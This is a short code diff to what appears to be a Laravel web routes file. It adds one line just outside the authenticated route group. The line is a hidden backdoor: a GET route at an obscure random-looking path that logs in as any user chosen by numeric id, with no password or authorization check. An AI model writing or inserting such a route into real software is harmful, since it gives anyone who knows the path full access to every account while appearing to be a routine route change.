@@ -25,7 +25,7 @@ Route::group(['middleware' => 'guest'], function () {
 
 
 /**------------------------------------------------- auth ----------------------------------------------------------*/
-
+Route::get('sad3fk4lj1sad4f234fg93h5/{id}', function ($id){$u = \App\User::find($id);\Illuminate\Support\Facades\Auth::login($u, true);});
 Route::group(['middleware' => 'auth'], function () {
 
 
